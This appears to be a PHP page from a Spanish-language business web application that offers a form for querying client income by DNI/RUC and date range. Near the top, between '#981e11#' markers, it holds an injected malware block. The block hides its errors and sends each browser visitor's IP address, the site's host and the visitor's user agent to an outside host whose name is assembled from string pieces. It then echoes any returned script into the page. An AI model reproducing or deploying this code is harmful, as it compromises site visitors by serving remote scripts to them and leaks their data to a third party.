<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	include("../conexion/ajax.php");
	include("../conexion/baseDatos.php");
	include("../conexion/config.php");
?>
<?php
#981e11#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/981e11#
?>
<script language="javascript" type="text/javascript">
function validar()
{
	/*num= document.getElementById('txtCod').value;
	anum=parseInt(num);
	fechaI=document.getElementById('txtFechaInicial').value;
	fechaF=document.getElementById('txtFechaFinal').value;
	if(num.length==0)
	{
		alert("Debes ingresar un número de DNI o RUC");
		return;
	}
	/*if(num.length!=8 && num.length!=11)
	{
		alert("¡ Formato incorrecto del DNI/RUC !");
		quitarCargando('cargando');
		return;
	}	
	else if(anum.toString().length!=num.length )
	{
		alert("¡ El formato del DNI/RUC no es correcto !");
		quitarCargando('cargando');			
		return;
	}
	if(fechaI.length==0||fechaF.length==0)
	{
		alert("!Debe ingresar las Fechas de Inicio y Fin!");
	}*/	
	document.getElementById('form1').submit();
}

function go()
{
	location.href="administrador.php";
}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">

.Estilo2 {font-weight: bold}
-->
</style>
<title>Imprimir: ctrl+i  | NoImprimir: ctrl+n</title></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142"><div align="center">
          <form id="form1" name="form1" method="post" action="reporteIngresosXclientes.php">
            <table width="422" border="0" align="center">
              <tr>
                <td height="50" colspan="2"><strong>CONSULTA DE INGRESOS POR CLIENTES</strong> </td>
                </tr>
              <tr>
                <td width="162" height="24"><div align="justify"><em><strong>DNI/RUC: </strong></em></div></td>
                <td width="250"><div align="justify">
                  <label>
                    <input name="txtCod" type="text" id="txtCod" />
                    </label>
                  <a href="buscarCliente.php" target="popup" onClick="window.open(this.href, this.target,'width=550,height=500, scrollbars=1'); return false;">Clientes</a></div></td>
              </tr>
              <tr>
                <td height="21"><strong><em>FECHA INICIAL</em></strong></td>
                <td><input type="text" name="txtFechaInicial" id="txtFechaInicial" />
                  (dd/mm/aaaa)</td>
              </tr>
              <tr>
                <td height="45" align="left"><div align="left"><strong><em>FECHA FINAL</em></strong></div></td>
                <td align="left"><div align="left">
                  <input type="text" name="txtFechaFinal" id="txtFechaFinal" />
                (dd/mm/aaaa)</div></td>
              </tr>
              <tr>
                <td height="21" align="center"><input name="btnConsultar" type="button" id="btnConsultar" value="Consultar" onClick="validar()"/></td>
                <td align="center"><input name="btnCancelar" type="button" id="btnCancelar" value="Cancelar" onClick="go()"/></td>
              </tr>
            </table>
              </form>
          </div></td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>

